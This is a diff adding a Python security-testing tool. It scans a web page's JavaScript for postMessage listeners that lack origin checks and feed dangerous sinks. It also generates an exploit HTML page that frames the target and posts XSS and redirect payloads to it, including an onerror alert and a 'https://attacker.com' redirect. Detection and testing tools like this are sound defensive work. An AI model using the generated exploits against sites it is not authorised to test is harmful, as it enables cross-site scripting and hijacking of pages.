@@ -1,0 +1,248 @@
+#!/usr/bin/env python3
+"""
+postmessage_scanner.py — Detect unsafe postMessage listeners in JavaScript.
+
+Fetches a page, extracts inline and linked JS, then looks for postMessage
+listeners that lack origin validation and dangerous sinks (eval, innerHTML, etc.).
+
+Usage:
+  python3 tools/postmessage_scanner.py --url https://target.com
+  python3 tools/postmessage_scanner.py --url https://target.com --dry-run
+"""
+
+import argparse
+import json
+import re
+import sys
+import urllib.request
+import urllib.error
+import urllib.parse
+
+# ─── Color codes ──────────────────────────────────────────────────────────────
+RED    = "\033[91m"
+YELLOW = "\033[93m"
+GREEN  = "\033[92m"
+CYAN   = "\033[96m"
+BLUE   = "\033[94m"
+BOLD   = "\033[1m"
+DIM    = "\033[2m"
+RESET  = "\033[0m"
+
+LISTENER_PATTERNS = [
+    re.compile(r'addEventListener\s*\(\s*["\']message["\']', re.IGNORECASE),
+    re.compile(r'onmessage\s*=', re.IGNORECASE),
+]
+
+ORIGIN_CHECK_PATTERNS = [
+    re.compile(r'event\.origin\s*[=!]=', re.IGNORECASE),
+    re.compile(r'e\.origin\s*[=!]=', re.IGNORECASE),
+    re.compile(r'\.origin\s*!==', re.IGNORECASE),
+    re.compile(r'trustedOrigins', re.IGNORECASE),
+    re.compile(r'allowedOrigins', re.IGNORECASE),
+    re.compile(r'whitelist', re.IGNORECASE),
+]
+
+SINK_PATTERNS = {
+    "eval":              re.compile(r'\beval\s*\('),
+    "innerHTML":         re.compile(r'\.innerHTML\s*='),
+    "document.write":    re.compile(r'document\.write\s*\('),
+    "document.location": re.compile(r'document\.location\s*='),
+    "window.location":   re.compile(r'window\.location\s*='),
+    "location.href":     re.compile(r'location\.href\s*='),
+    "location.replace":  re.compile(r'location\.replace\s*\('),
+    "setTimeout":        re.compile(r'setTimeout\s*\('),
+    "setInterval":       re.compile(r'setInterval\s*\('),
+    "Function()":        re.compile(r'new\s+Function\s*\('),
+    "src =":             re.compile(r'\.src\s*='),
+    "outerHTML":         re.compile(r'\.outerHTML\s*='),
+    "insertAdjacentHTML":re.compile(r'insertAdjacentHTML\s*\('),
+}
+
+
+def _get(url: str, timeout: int = 15) -> tuple[int, dict, str]:
+    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            return r.status, dict(r.headers), r.read().decode("utf-8", errors="replace")
+    except urllib.error.HTTPError as e:
+        return e.code, {}, ""
+    except Exception:
+        return 0, {}, ""
+
+
+def extract_script_urls(base_url: str, html: str) -> list[str]:
+    parsed = urllib.parse.urlparse(base_url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    urls = []
+    for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html, re.IGNORECASE):
+        src = m.group(1)
+        if src.startswith("http"):
+            urls.append(src)
+        elif src.startswith("//"):
+            urls.append(parsed.scheme + ":" + src)
+        elif src.startswith("/"):
+            urls.append(origin + src)
+        else:
+            urls.append(origin + "/" + src)
+    return urls
+
+
+def analyze_js(js_text: str, source: str) -> list[dict]:
+    findings = []
+    lines = js_text.splitlines()
+
+    for i, line in enumerate(lines):
+        for pat in LISTENER_PATTERNS:
+            if pat.search(line):
+                # Check surrounding context (±20 lines) for origin check
+                context_start = max(0, i - 5)
+                context_end = min(len(lines), i + 40)
+                context = "\n".join(lines[context_start:context_end])
+
+                has_origin_check = any(op.search(context) for op in ORIGIN_CHECK_PATTERNS)
+
+                sinks_found = [name for name, sp in SINK_PATTERNS.items() if sp.search(context)]
+
+                severity = "INFO"
+                if not has_origin_check and sinks_found:
+                    severity = "HIGH"
+                elif not has_origin_check:
+                    severity = "MEDIUM"
+
+                findings.append({
+                    "source": source,
+                    "line": i + 1,
+                    "listener": line.strip()[:120],
+                    "has_origin_check": has_origin_check,
+                    "dangerous_sinks": sinks_found,
+                    "severity": severity,
+                })
+                break  # one finding per line
+
+    return findings
+
+
+def generate_poc(target_url: str, findings: list[dict]) -> str:
+    sinks = set()
+    for f in findings:
+        sinks.update(f.get("dangerous_sinks", []))
+
+    if "document.location" in sinks or "window.location" in sinks or "location.href" in sinks:
+        payload = "window.location = 'https://attacker.com'"
+    elif "innerHTML" in sinks:
+        payload = "document.body.innerHTML = '<img src=x onerror=alert(1)>'"
+    elif "eval" in sinks:
+        payload = "alert(document.domain)"
+    else:
+        payload = "console.log('postMessage received:', event.data)"
+
+    poc = f"""<!DOCTYPE html>
+<!-- postMessage exploitation PoC — generated by postmessage_scanner.py -->
+<html>
+<head><title>postMessage PoC</title></head>
+<body>
+<h2>postMessage PoC for {target_url}</h2>
+<iframe id="target" src="{target_url}" style="width:800px;height:400px"></iframe>
+<script>
+  // Wait for iframe to load before sending message
+  document.getElementById('target').onload = function() {{
+    var msg = {{
+      // Adjust payload key/value to match what the listener reads from event.data
+      action: 'navigate',
+      url: 'https://attacker.com',
+      html: '<img src=x onerror=alert(document.domain)>',
+      cmd: '{payload}'
+    }};
+    // No origin restriction — sends to any origin
+    document.getElementById('target').contentWindow.postMessage(JSON.stringify(msg), '*');
+    document.getElementById('target').contentWindow.postMessage(msg, '*');
+  }};
+</script>
+</body>
+</html>"""
+    return poc
+
+
+def main():
+    ap = argparse.ArgumentParser(description="postMessage listener analyzer")
+    ap.add_argument("--url", required=True, help="Target page URL")
+    ap.add_argument("--dry-run", action="store_true", help="Print actions without fetching")
+    ap.add_argument("--output", help="Write JSON results to file")
+    ap.add_argument("--poc", help="Write PoC HTML to file")
+    args = ap.parse_args()
+
+    print(f"{BOLD}{BLUE}╔══════════════════════════════════════════╗{RESET}")
+    print(f"{BOLD}{BLUE}║      postMessage Origin Scanner          ║{RESET}")
+    print(f"{BOLD}{BLUE}╚══════════════════════════════════════════╝{RESET}\n")
+
+    all_findings = []
+
+    if args.dry_run:
+        print(f"  {DIM}[dry-run] Would fetch {args.url} and all linked JS files{RESET}")
+        output = {"target": args.url, "dry_run": True, "findings": [], "poc": None}
+        print(json.dumps(output, indent=2))
+        return
+
+    print(f"{CYAN}[*] Fetching {args.url}{RESET}")
+    status, headers, html = _get(args.url)
+    if not html:
+        print(f"{RED}[!] Failed to fetch {args.url} (status={status}){RESET}")
+        sys.exit(1)
+
+    # Analyze inline scripts
+    for m in re.finditer(r'<script(?:[^>]*)>(.*?)</script>', html, re.DOTALL | re.IGNORECASE):
+        inline_js = m.group(1)
+        findings = analyze_js(inline_js, source="inline")
+        all_findings.extend(findings)
+
+    # Fetch and analyze external scripts
+    script_urls = extract_script_urls(args.url, html)
+    print(f"{CYAN}[*] Found {len(script_urls)} external script(s){RESET}")
+    for surl in script_urls[:20]:  # cap at 20 scripts
+        print(f"  {DIM}Fetching {surl}{RESET}")
+        _, _, js_text = _get(surl)
+        if js_text:
+            findings = analyze_js(js_text, source=surl)
+            all_findings.extend(findings)
+
+    # Report
+    print(f"\n{BOLD}── Results ─────────────────────────────────────────────{RESET}")
+    if not all_findings:
+        print(f"  {GREEN}No postMessage listeners found.{RESET}")
+    for f in all_findings:
+        color = RED if f["severity"] == "HIGH" else YELLOW if f["severity"] == "MEDIUM" else DIM
+        origin_label = f"{RED}NO origin check{RESET}" if not f["has_origin_check"] else f"{GREEN}origin check present{RESET}"
+        print(f"  {color}[{f['severity']}]{RESET} Line {f['line']} in {f['source'][:60]}")
+        print(f"         Origin: {origin_label}")
+        if f["dangerous_sinks"]:
+            print(f"         Sinks: {RED}{', '.join(f['dangerous_sinks'])}{RESET}")
+        print()
+
+    poc_html = generate_poc(args.url, all_findings) if all_findings else None
+
+    if args.poc and poc_html:
+        with open(args.poc, "w") as fh:
+            fh.write(poc_html)
+        print(f"{GREEN}[+] PoC written to {args.poc}{RESET}")
+    elif poc_html:
+        print(f"\n{BOLD}{CYAN}── PoC HTML ─────────────────────────────────────────────{RESET}")
+        print(poc_html)
+
+    output = {
+        "target": args.url,
+        "dry_run": False,
+        "scripts_analyzed": len(script_urls) + 1,
+        "findings": all_findings,
+        "poc": poc_html,
+    }
+
+    if args.output:
+        with open(args.output, "w") as fh:
+            json.dump(output, fh, indent=2)
+        print(f"{GREEN}[+] Results written to {args.output}{RESET}")
+
+    print(json.dumps(output, indent=2))
+
+
+if __name__ == "__main__":
+    main()
